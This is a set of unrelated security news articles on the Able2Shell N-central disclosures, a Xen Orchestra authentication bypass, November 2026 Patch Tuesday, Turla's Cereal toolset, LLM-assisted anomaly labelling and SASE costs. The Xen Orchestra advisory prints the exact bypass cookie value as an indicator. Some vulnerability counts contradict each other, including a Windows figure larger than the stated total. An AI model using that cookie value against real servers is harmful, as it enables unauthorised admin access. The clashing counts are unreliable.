c2144bee8896.text:
N-able released a hotfix for N-central that fixes seven CVEs after a researcher published proof-of-concept code for 33 alleged zero-day vulnerabilities. The researcher says one attack chain needs no credentials.

Key Takeaways

Able2Shell is a set of 33 alleged vulnerabilities in N-able N-central, published with proof-of-concept code. The researcher says one chain lets an unauthenticated attacker run commands on the server.

Security firms report exploitation attempts against N-central honeypots, but as of November 10, no confirmed compromise of a customer server has been reported.

N-able released N-central 2026.4 Hotfix 2 on November 10. It fixes seven CVEs.

Background

Tenable's Research Special Operations (RSO) team has compiled this blog to answer Frequently Asked Questions (FAQ) regarding Able2Shell, a set of reported zero-day vulnerabilities in N-able N-central.

FAQ

When was Able2Shell first disclosed?

A researcher operating under the GitHub account “Oracle-Security” published a write-up titled “Able2Shell” in the account’s CVEs repository. It describes 33 alleged N-central vulnerabilities with proof-of-concept code. The earliest README commit is dated November 9, 2026 at 04:14 UTC. N-able described the release as a public disclosure by an independent security researcher. N-able does not state whether it was notified in advance and does not name the researcher.

What are the vulnerabilities associated with Able2Shell?

On November 10, N-able published seven CVE records for vulnerabilities fixed in N-central 2026.4 Hotfix 2. On its status page, N-able says the release addresses “the most critical November 9 vulnerabilities” and that a follow-up hotfix will provide further security updates. The page lists all seven as related CVEs. One, CVE-2026-91000, had been reserved on September 14, before the public Able2Shell disclosure.

CVE

Description (per N-able)

CVSSv4

CVE-2026-125883

Multiple XML external entity (XXE) vulnerabilities

9.3

CVE-2026-125881

Schema-hint server-side request forgery (SSRF) via service import schema validation

9.3

CVE-2026-125878

Multiple OGNL injection vulnerabilities

8.7

CVE-2026-125879

Local privilege escalation to root via nable-writable syslog-ng config

8.6

CVE-2026-125882

Remote code execution via file repository upload path traversal

8.6

CVE-2026-91000

Insecure IPC channels lead to local privilege escalation

8.4

CVE-2026-125880

Stored cross-site scripting (XSS) via MMS3 patch metadata (admin context)

8.3

N-able’s CVE titles match several finding types in the researcher’s README, but N-able has not said which of the 33 findings each CVE addresses. N-able credits CVE-2026-125882 to Nate Fair of Sprocket Security, and a file repository path traversal also appears in the README.

Is Able2Shell one vulnerability or several?

Several. The README lists 33 findings, and some of them are steps in longer exploit chains built from other entries on the same list. The researcher lists four exploit chains. The rest are standalone findings.

Chain

Login needed

Reaches

Service import XXE

None

Commands as the nable account

MMS3 stored XSS to OGNL execution

None to plant, but an administrator has to view it

Commands as the nable account

MMS3 stored XSS to Audit Export

None to plant, but an administrator has to view it

Commands as root

SIS file path traversal to syslog installer

Yes

Commands as root

The researcher describes the XXE chain as credential-free, and N-able's record for CVE-2026-125883 lists no privileges and no user interaction as required. The researcher’s proof-of-concept takes several identifiers as inputs, and other findings in the README describe anonymous ways to obtain some of them. The XXE step has the appliance fetch a file from an attacker-hosted server.For the MMS3 chains, the researcher says an unauthenticated attacker can plant the script, which runs when a logged-in administrator views the poisoned patch details. N-able’s record for CVE-2026-125880 lists high privileges and active user interaction.

How severe is Able2Shell?

Two of the four chains reach root: MMS3 stored XSS to Audit Export, and SIS path traversal to syslog. The XXE chain runs commands as the nable account (uid 992), and the researcher’s proof-of-concept can also create an administrator account. N-able’s CVSSv4 scores for the seven CVEs range from 8.3 to 9.3, and N-able calls Hotfix 2 a critical security update.

Has N-able confirmed the findings?

N-able has published seven CVEs and a hotfix, but it has not mapped its CVEs to the researcher’s 33 findings or commented on them individually. Before the hotfix, N-able said it was responding to the public disclosure of critical vulnerabilities in N-central by an independent security researcher.

Which versions are affected?

N-able's CVE records list N-central versions before 26.4.1 as affected (the record for CVE-2026-91000 writes this as 2026.4.1), and the fixed build is 2026.4.1.26. The researcher says all testing was done on N-central Appliance 2026.4.0.31, which the researcher describes as a pre-release build, and that "most if not all vulnerabilities should work on previous versions."

Is the hosted N-central service affected?

N-able took its hosted N-central environments offline as a precaution after the disclosure, and its status page lists hosted N-central in the Americas, APAC and Europe among the affected services. On November 10, N-able said all hosted N-central servers across all global regions had been upgraded to the new release. Hosted customers still upgrade their own Agents and Probes.

Has Able2Shell been exploited in the wild?

N-able's status page says it is observing “scanning activity associated with the published proof-of-concept code.” Huntress reported N-able’s statement that it had no evidence that any customer environment had been successfully exploited, and said on November 10 that it had not observed evidence of Able2Shell exploitation in its partners’ environments.

Beazley Security Labs updated its November 9 advisory on November 10 with watchTowr’s report of exploitation attempts against its N-central honeypots. Beazley Security Labs says a confirmed compromise of a customer server “has not been reported.”

Previdian reports exploitation attempts against its N-central decoy environment, not confirmed compromise. Its decoys recorded 68 events from one source IP address starting on November 9, including XXE and sensitive-file access attempts. Previdian says these do not show a completed account takeover or command execution, or a full replay of the published chain.

Which threat actors are exploiting Able2Shell?

As of November 10, there are no details available for any threat actor activity connected to Able2Shell exploitation.

Is there a proof-of-concept (PoC) available?

Yes. The researcher’s README includes Python proof-of-concept code for the alleged vulnerabilities, tested against N-central Appliance 2026.4.0.31.

How does this relate to earlier N-central vulnerabilities?

Able2Shell is a newly disclosed set of vulnerabilities, and it is not known whether any relate to earlier N-central flaws. None of the seven CVEs fixed in Hotfix 2 is in CISA’s Known Exploited Vulnerabilities (KEV) catalog as of November 10. Five earlier N-central CVEs are in the KEV catalog:

CVE

Description

Date Added to KEV

CVE-2026-86218

Static code injection

September 8, 2026

CVE-2026-18556

Authentication bypass

August 4, 2026

CVE-2026-18577

Authentication bypass

August 3, 2026

CVE-2025-8876

Command injection

August 13, 2025

CVE-2025-8875

Insecure deserialization

August 13, 2025

Are patches or mitigations available?

Yes. On November 10, N-able released N-central 2026.4 Hotfix 2 (build 2026.4.1.26), which fixes the seven CVEs above. According to N-able, on-premises customers upgrade their own servers, while N-able upgrades hosted servers. All customers also upgrade their Agents and Probes, Agents first, because an upgraded Probe cannot communicate with Agents that have not been upgraded. Until an on-premises server is upgraded, N-able recommends keeping it offline. A follow-up hotfix with further security updates is also planned. Hotfix 2 removes legacy mobile device management (MDM). The release notes list N-central’s built-in remote control as temporarily disabled, while Take Control continues to work.Are there indicators of compromise?

Yes. Beazley Security Labs and Previdian have published network indicators tied to exploitation attempts, including source IP addresses and the SOAP endpoints targeted. Huntress recommends reviewing login and authentication activity from November 8 onward, and watching for anomalous remote access sessions, newly deployed scripts and unauthorized new administrator accounts.

Yes. Tenable has classified CVE-2026-125883 as a Vulnerability of Interest (VOI) under Vulnerability Watch. CVE-2026-125878, CVE-2026-125881 and CVE-2026-125882 are each classified as a Vulnerability Being Monitored (VBM).

Following on from research presented at Black Hat USA 2025, Sophos data scientists Ben Gelman, Tamas Nyiri, and Tibor Kristóf Lányi recently showcased new work on anomaly detection at BSides Las Vegas 2026. As promised, we’re sharing more details of that research (the recording of the talk is also available here).

Supervised classifiers in cybersecurity are often trained on data that doesn't capture the most unusual examples. Benign training sets are dominated by simple, common patterns, while malicious sets reflect known attacks from past investigations. The long tail of unusual files on both sides goes unlabeled.

When these files appear in production, classifiers are more likely to misclassify them, generating false positives that overwhelm SOCs, and false negatives that let threats through.

Traditional approaches to labeling difficult examples rarely scale. Doing it manually is expensive, rule-based collection is too narrow, and anomaly detection alone has historically produced unacceptable false positive rates. But anomaly detection combined with LLMs is excellent at something else: finding and labeling the unusual data that is missing from cybersecurity training sets.

The team developed an automated pipeline that combines anomaly detection and LLMs to augment training data for a suite of cybersecurity models, using complementary anomaly detection methods, viable across feature representations, to surface distinctly unusual data. Then, an LLM classified each anomaly with format-specific prompts calibrated per data type.

Critically, Ben and his colleagues used separate prompts that err toward malicious and benign respectively, achieving high precision on both label types. More specifically, one prompt instructed the LLM to only evaluate the input as benign when it was confident that it was benign; the other prompt instructed the same but with the malicious label. This way, they only accepted the labels when the two LLMs with the two different instructions agreed, otherwise they threw that example away and didn’t use it for training. In practice, this method produced labels with better precision (tested on labeled data). The labeled anomalies augment the training data for cybersecurity classifiers.

The Sophos AI team evaluated their method across three structurally different data types with monthly ingestion scales spanning four orders of magnitude: command lines, HTML, and RTF.

The problem

Every detection team is familiar with the core issue: supervised classifiers are only as good as their training data, and that data is systematically biased. Benign training data comes from sources chosen for labeling confidence.

Known-clean networks, corporate environments without incidents and regex-capturable patterns are obvious choices, but they inherently exclude the long tail of unusual but legitimate data.

Malicious training data is similarly constrained to known attack types from incident investigations. The events that classifiers get wrong in production are precisely the unusual events missing from both sides of the training set.

Using command lines as an example: prior work on anomaly detection for command-line classification has attempted to address labeling oversights by surfacing anomalies as direct alerts. SCADE uses isolation forests and engineered features to flag potentially malicious command lines at scale, but reports false positive rates around 2%. Filar and French discover anomalous parent-child process relationships using tree-based models, reporting similar ~3% false positive rates. Nisslmueller combines explicit command-line featurization with parent-child context for unsupervised LOLBin detection, also landing under 2% FP.

Although these rates sound low, at tens of millions of daily events they still produce overwhelming alert volumes. All three share the fundamental limitation of treating anomaly detection as an end-to-end alerting mechanism.

Ben and team’s approach sidesteps this limitation entirely: anomaly detection surfaces candidates, an LLM labels them, and the labels improve a downstream supervised classifier.

A key takeaway from the team’s work is the prompt strategy for achieving high precision on both malicious and benign labels. A single prompt struggles to simultaneously maintain high precision on both labels. Instead, the team used two separate prompts per file type: one that errs on the side of calling files malicious (producing high-precision benign labels), and another that errs on the side of calling files benign (producing high-precision malicious labels). This allows both label types from anomaly detection to be usable as training data, which was not achievable in prior work that relied on a single labeling pass.

Stand back, we’re doing science

The pipeline for Ben and team’s research was as follows:

Raw production telemetry

Feature extraction

Multi-method anomaly detection

LLM classification

Newly labeled training data from the long tail

Supervised classifier improvement

A key architectural decision was to treat anomaly detection not as the detection system itself, but as a prefilter that surfaces candidates for LLM labeling, which in turn produces training data for a supervised classifier whose precision can be controlled empirically.

Because each anomaly detection method has blind spots – it catches certain types of unusual data and misses others – Sophos AI used three methods (isolation forest, k-means anomaly, and PCA reconstruction error) on different feature representations, producing broader coverage with low overlap between methods.

The team employed several different feature sets, which contributed to data diversity:

Hand-crafted features: Catching structural anomalies, such as files with extreme length, abnormal Shannon entropy, rare character distributions. Hand-crafted features included character-level statistics, operator/case proportions, and file-type-specific markers.

TF-IDF vectors: To catch content-level outliers, e.g., files whose token distribution didn't match any typical cluster.

Binary vocabulary vectors: For the unusual feature correlations, e.g., files with atypical token co-occurrence patterns.

Prompt needed

A single LLM prompt can’t always achieve high precision on both malicious and benign labels simultaneously, especially in cases where the problem itself is inherently ambiguous, such as dual use scripts . For example, if the prompt says, ‘when uncertain, lean toward malicious,’ benign precision is high, but malicious precision suffers and vice versa.

Sophos AI’s solution was to run two separate prompts per file type. One erred towards malicious (producing high-precision benign labels), the other toward benign (producing high-precision malicious labels). Each prompt was calibrated to the file type's specific attack surface.

For example, with HTML, the malicious-leaning prompt defined what normal HTML looks like (JavaScript, forms, analytics) so it didn’t over-flag standard web features. The benign-leaning prompt defined specific malicious indicators (obfuscated payloads, credential phishing, exploit kit structures), so it didn’t under-flag real threats.

Putting it to the test

Ben and colleagues evaluated this method across three structurally different data types:

Command lines: ~10,000,000 monthly ingest. Attack surface: LOLBin abuse, obfuscated PowerShell, encoded payloads.

HTML files: ~1,000,000 monthly ingest. Attack surface: exploit kits, credential phishing, obfuscated JavaScript.

RTF documents: ~10,000 monthly ingest (testing under data scarcity). Attack surface: Equation Editor exploits, DDE attacks, malicious OLE.

The results on LOLBins can be found in the previous research. But expanding the work to HTML and RTF files elucidated more generalizable trends, and suggests that the method can work with a variety of data types.

Like LOLBins, RTF performed best with isolation forest, showing a 2.41% increase over the existing model, which is an encouraging jump at such a high ROC AUC.

With HTML, we see a different result. The baseline performance of the model is higher, so the increase is more modest, but the team found that K-means was the most effective with a 0.68% increase over baseline. They also noted that PCA decreased the score, which highlights exactly why they used three different anomaly detection methods: they didn’t know in advance which method would capture the most valuable anomalies in a particular dataset. And since running these algorithms is relatively cheap, the small extra cost only comes from running the evaluations on the extra anomalies with the LLM.

Try it yourself

Here’s something our data science-minded readers can try out for themselves:

Pick a file type where your classifier has a false positive or false negative problem

Pull a sample of unlabeled production data, featurize it, and run Isolation Forest (it's 10 lines of sklearn)

Send the top anomalies to an LLM with a format-specific prompt. Use two prompts: one that errs malicious, one that errs benign

(Optional) Check the quality of the LLM output on a sample either by running it on a set of your labeled data or even better, have an analyst verify the unlabeled ones

Add the high-precision labels to your next training run and measure the difference

Wrap it in a YAML config and schedule it. All being well, you now have a self-improving data pipeline

Top takeaways

Classifiers’ failure cases are a training data diversity problem; anomaly detection finds the unusual files that rules and manual labeling miss

Multi-method anomaly detection (IF + KMeans + PCA) on different feature representations catches more than any single method

Dual-prompt LLM labeling achieves high precision on both malicious and benign labels, making both usable as training data

The pipeline is filetype-agnostic (as long as an LLM can produce high precision labels for them – test this empirically first) and runs on a single machine. A new data type therefore requires a config file, rather than having to become an onerous engineering project

Although research on traditional ML models has slowed in recent times, this research shows that LLMs can help revitalize the field by infusing them into the process for significant performance gains

French software company Vates VMS has warned of a critical security vulnerability in Xen Orchestra that it said is being actively exploited in the wild.

The authentication bypass flaw, which does not yet have a CVE identifier, is tracked as VSA-2026-062.

"REST cookie parsing turns authenticationToken=j:%7B%7D into {}," Vates VMS said in an alert. "REST authentication passes that object to the XO token provider without requiring a string."

"The token collection treats {} as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated /rest/v0/users/me/authentication_tokens route then returns reusable login token IDs."

In other words, the vulnerability can allow an attacker to bypass authentication by sending a specially crafted cookie and perform arbitrary actions with "Admin" privileges, ultimately resulting in arbitrary code execution on managed pools and a full XCP-ng node takeover as root.

Vates VMS said it's seeing the vulnerability being actively exploited by a threat actor from the following IP address and TOR domain -

91.211.251[.]112:8001, which has been flagged as a RedLine Stealer command-and-control (C2) server on VirusTotal

ustar3rqxgnskzgnwkgpofgtvxevm6cx3lxdbwt4mndtveqyaohid[.]onion:3333

It's unclear when the activity started and if the vulnerability was exploited as a zero-day.

Other indicators of compromise are listed below -

HTTP requests containing authenticationToken=j:%7B%7D or authenticationToken=j:{}

A running virtual machine named pivot2

Virtual machines configured using "hvm_serial: file" parameter

Suspicious files named /etc/cron.d/zz-ustar2, /etc/cron.d/zz-ustar, /.ustar5, and /.ustar6

The issue has been addressed in Xen Orchestra 6.9.1 and 6.10.0 for the stable and latest channels, as well as xo-server versions 5.211.2 and 5.213.1. If immediate patching is not an option, the following mitigations are advised -

Avoid exposing Xen Orchestra instances on the internet

Block the IP address and domain associated with malicious activity

Block the empty token in a web application firewall (WAF) or a reverse proxy

Rotate all passwords and secrets in Vates VMS if indicators of compromise are detected

Filip Magic (@mad31k) and Christoffer Olsen from TDC NET Security have been credited with discovering and reporting the flaw.

151f36704f24.text: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch. Jake Knott, head of threat intelligence at exposure management firm watchTowr, succinctly said in an email to The Register: “Maybe we should just go home.” “Most security teams haven’t quite recovered from the last month of bumper-to-bumper critical vulnerabilities, emergency patches, and ‘2shell’-branded everything, and we’re yet again at another Patch Tuesday,” Knott told us. Starting with the zero-day: It’s an Outlook spoofing vulnerability, tracked as CVE-2026-124194, and it only garnered a 6.5 out of 10 CVSS rating. But as Dustin Childs, head of threat awareness at TrendAI’s Zero Day Initiative, warns, don’t let the score or the name lull you into thinking it’s OK to put off patching this one. “It’s labeled spoofing, but the impact is bigger than the name suggests,” Childs said in his monthly Patch Tuesday review. “An attacker sends a specially crafted message file and convinces a user to open it,” he wrote. “Outlook then connects to an attacker-controlled network location without showing the usual external-content warning, which discloses the user’s NTLMv2 hash. The attacker can use that hash to authenticate as the user.” Microsoft marked CVE-2026-124194 as exploited, but per usual didn’t say when the attacks started, who is battering this bug, and what they are doing with the access post exploitation. These details will likely start trickling out soon. Plus, now that there’s a public fix, other miscreants are undoubtedly already scanning for vulnerable versions and reverse engineering the patch for their own attack purposes. So prioritize this fix, and keep an eye on your inbox for any suspicious files. Back-to-back months of 1K+ CVEs Despite the second month of more than 1,000 CVEs (October had 1,474), CVE-2026-124194 is the only one under active exploitation, and none of the 1,094 are listed as publicly known. Childs says this shouldn’t give organizations “false comfort.” “Logging back-to-back months above 1,000 CVEs proves automated bug-hunting has permanently reset patch volume,” he told The Register. “With AI making patch-diffing and exploit generation near-instant, the threat window opens the minute these updates drop.” For defenders, this means two things, Childs added. “What defenders need to know and do right now is abandon broad triage and take immediate defensive action: patch Exchange and Domain Controllers (LDAP/Kerberos) first to stop zero-click compromise, ring-fence exposed network services like DNS and DHCP to prevent wormable spread, and verify manual administrative fixes on your cloud services,” he said. Zero-click threats There are two zero-click threats in this month’s batch of fixes: CVE-2026-116928 and CVE-2026-119958. Both are critical, carrying 9.8 CVSS ratings, in part because they don’t require any user interaction to exploit. CVE-2026-116928 is an out-of-bounds write in Microsoft Windows Search Component that could lead to remote code execution. An unauthenticated attacker could abuse this search feature in Exchange “by sending an email containing a specially crafted attachment,” Redmond warned. “Exchange automatically processes the attachment for indexing, so the recipient does not need to open the email or attachment. Successful exploitation could allow the attacker to execute code with the permissions of the affected processing service.” CVE-2026-119958 is an out-of-bounds write vulnerability in Windows' implementation of the Lightweight Directory Access Protocol (LDAP) that could allow unauthenticated attackers to execute code remotely without user interaction. This one can be exploited by sending specially crafted LDAP requests to vulnerable systems, potentially compromising domain controllers. Childs also counts 30 CVEs that pose a “wormable risk,” requiring zero authentication and zero user interaction over a network. All of those are listed in his blog, so prioritize fixing those as well. And…Xbox remote code execution And finally, for funsies, a critical flaw in the Windows Xbox Live Networking Service, CVE-2026-112967, that could allow remote code execution also made this month's roundup. It's a heap-overflow vulnerability with a 9.8 CVSS rating that doesn't require authentication or user interaction to exploit. So don't take a gaming break between testing November's updates. Or, if you do, at least make sure vulnerable Windows systems running the Xbox Live Networking Service are on your patching list, too. ®

Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 1,102 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve.

The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future.

Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month.

Outlook: zero-day spoofing

Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over to scan the handwriting on the back, which looks vaguely familiar. It’s addressed to you, but you can’t make out the signature, and the message is short and generic. Is that real handwriting, or has this been printed? Probably marketing material.

You put the card in the recycling and, since life is busy, you move on and forget about it. Somehow, you remain entirely unaware that, immediately after reading the postcard, you took out your phone and sent high-resolution images of your front door key to a number you’ve never contacted before.

Is this sketch just some rather questionable science fiction? Yes, hopefully, but what if that non-specific postcard was instead a malicious file in your Outlook inbox? Now we’re talking about CVE-2026-124194, an exploited-in-the-wild spoofing vulnerability. Merely opening a specially crafted malicious file causes Outlook to silently connect to an attacker-controlled location and leak the user’s NTLM v2 hash. All supported versions of classic Outlook receive patches.

The relatively low CVSS v3.1 base score of 6.5 does not tell the full story here, since this vulnerability provides value for both commodity attackers working to harvest initial access at scale, and also more targeted campaigns by more sophisticated threat actors.

The NTLM v2 hash can be relayed live to impersonate the user against another service, at least where those services do not implement adequate safeguards such as message signing for SMB or LDAP, as well as Extended Protection for Authentication for Exchange or Active Directory Certificate Services. Alternatively, the NTLM v2 hash can be cracked offline by a motivated attacker to retrieve the underlying credential. The Preview Pane is not a vector, which will help limit the real-world impact somewhat.

Windows Schannel: critical pre-auth RCE

A pre-authentication remote code execution (RCE) vulnerability in Windows will always attract attention. CVE-2026-119952 allows an attacker to execute code on a target system by sending specially crafted malicious packets. Since the vulnerable component is Schannel, which is Microsoft’s implementation of Transport Layer Security (TLS), attackers may not have to look very far to find vulnerable endpoints.

The advisory provides some comfort by pointing out that specific conditions are required for exploitability, which reduces the likelihood of broad exploitation, but the advisory still assesses exploitation as more likely, so Microsoft presumably expects that the development of reliable exploit code is feasible. In many cases, there will be no need for an attacker to have an existing foothold on the same subnet.

The execution context likely depends on the vulnerable service, which points to the evergreen need for least privilege architecture, but it also means that we cannot exclude the possibility of pre-auth RCE as SYSTEM in some cases.

Exchange/Windows Search: critical pre-auth RCE

Could someone take control of your Exchange server by sending a single email? In short: yes. Microsoft offers customers tight integration between various business-critical components. Exchange running on Windows is Microsoft on Microsoft, and the Windows Search component indexes email on behalf of Exchange.

An attacker aiming to exploit CVE-2026-116928 relies on this helpful synergy to achieve pre-auth RCE on the server by sending a malicious attachment, which Exchange will process automatically. How’s that for low attack complexity Although the advisory does not specify the context of execution, we should assume SYSTEM, since several of the services which might be involved do run with a high privilege level.

Since the patches are for Windows OS rather than Exchange itself, there’s no need to worry about which version of Exchange you’re running, so long as you are running only Exchange Subscription Edition, since all previous versions of Exchange are now fully beyond end of support.

Microsoft lifecycle update

There are fewer Microsoft product lifecycle changes in November 2026 than last month. As of Nov 11, 2026, .NET 8 Long Term Servicing channel moves past its release end date, along with PowerShell 7.4 LTS, and the 23H2 versions of the Enterprise, Education, and IoT editions of Windows 11.

Today is Microsoft's November 2026 Patch Tuesday, with security updates addressing a record-breaking 1,235 flaws, including one actively exploited Microsoft Outlook zero-day vulnerability.

This Patch Tuesday addresses 66 "Critical" vulnerabilities, 48 of which are Remote Code Execution (RCE), 15 are Elevation of Privilege (EoP), and three are Use-After-Free in Microsoft Edge.

The approximate number of bugs in each vulnerability category is listed below:

536 Elevation of Privilege Vulnerabilities

27 Security Feature Bypass Vulnerabilities

296 Remote Code Execution Vulnerabilities

157 Information Disclosure Vulnerabilities

46 Denial of Service Vulnerabilities

22 Spoofing Vulnerabilities

142 Microsoft Edge (Chromium-based) Vulnerabilities

Of the 1,235 vulnerabilities, approximately 639 are categorized under Windows or Microsoft Windows products/components.

When BleepingComputer reports on Patch Tuesday security updates, we only count vulnerabilities released by Microsoft on Patch Tuesday itself.

Therefore, today's total excludes 108 flaws fixed earlier this month, including one Entra Device Registration, 82 Mariner, and 25 Microsoft Edge flaws.

November's Patch Tuesday comes after a record-breaking 1,411 flaws in the October updates as Microsoft continues to use AI to find and patch vulnerabilities.

To learn more about the non-security updates released today, you can review our dedicated articles on the Windows 11 KB5132061 & KB5131087 cumulative updates and the Microsoft Windows 10 KB5131096 extended security update.

Microsoft patches 1 zero-days

This month's Patch Tuesday fixes one zero-day vulnerability in Microsoft Outlook that was exploited in attacks.

Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited when no official fix is available.

The actively exploited zero-day vulnerability addressed in the November 2026 Patch Tuesday updates is:

CVE-2026-124194 - Microsoft Outlook Spoofing Vulnerability

Microsoft patched a Microsoft Outlook Spoofing zero-day vulnerability that was actively exploited in attacks to steal NTLM account hashes.

"An unauthenticated attacker could send a specially crafted message file and convince a user to open it in an affected version of Microsoft Outlook," warns Microsoft.

"Opening the file could cause Outlook to connect to an attacker-controlled network location without displaying the usual external-content warning, potentially disclosing authentication information that could be used to impersonate the user. Exploitation requires network connectivity and user interaction."

This type of vulnerability is known as an NTLM credential disclosure flaw, where a malicious attachment, when opened, causes Windows to connect to an attacker-controlled network share.

When connecting, Windows may automatically attempt to authenticate to the remote server, exposing the user's NTLMv2 authentication hash, which can then be captured by the attacker and potentially cracked offline.

The recovered credentials could then be used to gain unauthorized access to corporate accounts.

Similar vulnerability have been exploited in the past, typically through malicious attachments sent in phishing campaigns.

Recent updates from other companies

Other vendors who released updates or advisories in November 2026 include:

Barracuda Networks released security updates for two vulnerabilities that can let attackers run commands with root privileges. A week later, these flaws were exploited in attacks.

Cisco released security updates for numerous products, including critical vulnerabilities Catalyst SD-WAN Controller, Secure Email Gateway, and Meraki.

Google released emergency security updates to patch a new Chrome vulnerability exploited in zero-day attacks.

Ivanti released security updates to patch two Connect Secure (ICS) remote access gateway flaws that have been chained in zero-day attacks since at least October 1.

N-able is working on a hotfix for an alleged 30+ zero-days that were publicly disclosed yesterday, causing the company to take its hosted N-central environments offline.

Linux distributions released security updates to fix an authentication bypass flaw involving OpenSSH and musl, dubbed "*sshole".

SAP released the November security updates, which include fixes for four maximum-severity vulnerabilities.

SonicWall released security updates for seven vulnerabilities in SonicOS firewalls, including an SSL-VPN authentication bypass flaw exploited in attacks.

Vates released security updates for a critical authentication bypass vulnerability in Xen Orchestra is being actively exploited in attacks.

Zyxel patched a zero-day vulnerability in its GS1900 series network switches that was exploited to compromise nearly 1,000 devices worldwide.

The November 2026 Patch Tuesday Security Updates

Below is the complete list of resolved vulnerabilities in the November 2026 updates. Note, this report does include the flaws fixed earlier this month.

To access the full description of each vulnerability and the systems it affects, you can view the full report here.

Category: Help & How To

From hacked French refrigerators igniting fires to a massive OpenSSH authentication bug hiding in plain sight for a decade, this week’s stories expose how lapses in basic security ripple into chaos—and why AI is now both a weapon and shield.

TA surprising announcement regarding SpinRite.

What is being "AI-pilled" and how does it happen.

OpenAI just released GPT-6 Cyber. What does that mean.

An irresponsible hacker published 30+ N-Able 0-days.

700 French refrigerators hacked. What's next.

Lots of listener feedback about the Cloudflare tunneling solution, Voyager 1, true hardware drive encryption, the random number 4 and the amount of debris in orbit

Then we look at a 10-year old serious SSH authentication bug (that's kinda wonderful)

Show Notes - https://www.grc.com/sn/SN-1104-Notes.pdf

You can submit a question to Security Now at the GRC Feedback Page.

The Russia-aligned state-sponsored threat actor known as Turla (aka Snake) is wielding a previously undocumented cyber espionage toolset called Cereal that's used to break into victims' Microsoft Exchange servers with an aim to surreptitiously collect emails.

According to an ESET report shared with The Hacker News ahead of publication, the sophisticated and modular tool is designed for long-term intelligence gathering and has been observed against two governmental entities in Kazakhstan and Romania in late 2025.

"The Cereal toolset is a carefully constructed instrument for long-term, stealthy cyber espionage," the Slovakian cybersecurity company said. "It leaves little on disk, avoids external infrastructure that could be discovered and blocked, and conceals itself within legitimate Exchange processes."

"The Cereal toolset demonstrates that, for Turla, Exchange servers are not just mail servers – they are durable collection points, internal execution hubs, and a suitable environment for hiding sophisticated .NET tradecraft."

The toolset is a collection of interconnected components that are capable of running on Microsoft Exchange servers, receiving commands, executing them in memory, mapping the infected network, and harvesting emails of interest. The initial access vector used to deliver the malware is unknown, although the group is known to conduct spear-phishing, watering hole, and ISP-level adversary-in-the-middle (AitM) attacks.

Cereal gets its name from the fact that the tools make extensive use of serialization, which refers to the process of converting a data structure or an object's state into a format that can be easily stored, transmitted, and reconstructed.

A number of aspects make the malware stand apart -

Absence of an external command-and-control (C2) infrastructure, instead abusing a compromised Exchange server for this purpose.

Sending commands in the form of separate, compiled .NET programs.

Using an automated email collection module, which is injected into legitimate Microsoft Exchange processes and is engineered to manipulate the email transport pipeline.

The combination of these techniques shows that the threat actor possesses a deep understanding of the internal workings of Microsoft Exchange, ESET added. The Cereal framework consists of eight moving parts that work together to provide the attackers with access to sensitive email data -

CerealRunner, which is deployed by the operator and serves as a pathway for dropping additional components, including CerealLoader, CerealSprinter, CerealIron, and CerealMoth.

CerealLoader, which loads and runs a .NET assembly from an encrypted file on disk, leading to the execution of CerealSprinter.

CerealSprinter, which functions similarly to CerealRunner and is used to decrypt and run CerealNeuron, CerealHermit, and CerealBox.

CerealIron, an injector that makes it possible to load and run .NET assemblies from non .NET processes.

CerealMoth, which receives an assembly and a method name as inputs, loads the assembly, and runs the specified method.

CerealNeuron, a passive backdoor that runs on a compromised Exchange Server and listens for incoming web requests on paths that appear like regular Exchange traffic to execute assemblies contained in CerealRunner binaries.

CerealHermit, a variant of CerealNeuron that reads commands from encrypted files on disk and has no network functionality of its own.

CerealBox, which is the email harvesting module that processes, filters, and collects email messages by injecting itself into the Exchange transport service ("EdgeTransport.exe").

Upon gaining visibility into the email flow, the malware looks for messages containing DOC, DOCX, or PDF attachments, and matches at least one of many hard-coded lists with sender addresses, recipient addresses, subject lines, or attachment names.

Emails that meet the filtering criteria are compressed, encrypted, and staged in files on disk, after which they are exfiltrated and deleted via CerealNeuron commands.

In the attack aimed at the Romanian government organization, CerealBox is said to have been configured to gather emails involving NATO and European Union institutional addresses, a pattern that aligns with Russia's strategic priorities.

The commands delivered as compiled .NET programs are handled by CerealRunner, which unpacks and executes the payloads in memory and then sends the results back to CerealNeuron for subsequent exfiltration to the threat actor in encrypted format.

The commands support retrieving mailboxes or specific messages; queuing Active Directory for computers, users, groups, and DNS records; running Windows Management Instrumentation (WMI) queries; extracting LSA Secrets; listing volume snapshots; and performing file operations.

"The sheer volume of near-identical binaries, each compiled for a specific task, strongly suggests that the operators have an internal framework that automates the compilation and packaging of commands," ESET researcher Matías Porolli said.

"Combined with a codebase built around modular, interchangeable components, the impression is one of a mature, well-engineered platform – rather than a loose collection of scripts."

The business case for secure access service edge (SASE) hinges on how well it integrates networking and security. Organizations that manage separate SD-WAN and security service edge (SSE) products alongside legacy VPNs may still contend with fragmented policies, multiple consoles, and substantial integration work. These operational costs can reduce the value of convergence.

A new Omdia Economic Validation report, The Economic Benefits of Fortinet Unified SASE (October 2026), examines the financial impact of a unified approach. Commissioned by Fortinet, Omdia interviewed customers in education, government, and healthcare—three sectors with tight budgets, distributed users, and strict compliance requirements—and developed an economic model based on their experiences. The findings connect lower infrastructure costs with reduced administrative effort and improved employee productivity.

The Three-Year Financial Model

Omdia used its interview findings to model a composite enterprise with approximately 50,000 employees, 500 locations, and 20,000 remote or hybrid workers. This model’s initial environment included costly WAN connections, multiple security products, and traditional VPN access. The model estimates the following over three years:

Approximately $50.1 million in benefits against $8.4 million invested, yielding $41.6 million in net value and a 493% return on investment

A 47% reduction in total cost of ownership (TCO) for networking, security, and operations

A 59% reduction in time spent managing and supporting operations, saving more than 21,000 hours

Payback within the first year, with approximately $13 million in first-year cumulative benefits against $3.5 million invested

These modeled results offer a framework for evaluating a SASE investment. Actual returns will depend on an organization’s existing infrastructure, connectivity costs, staffing, and deployment scope.

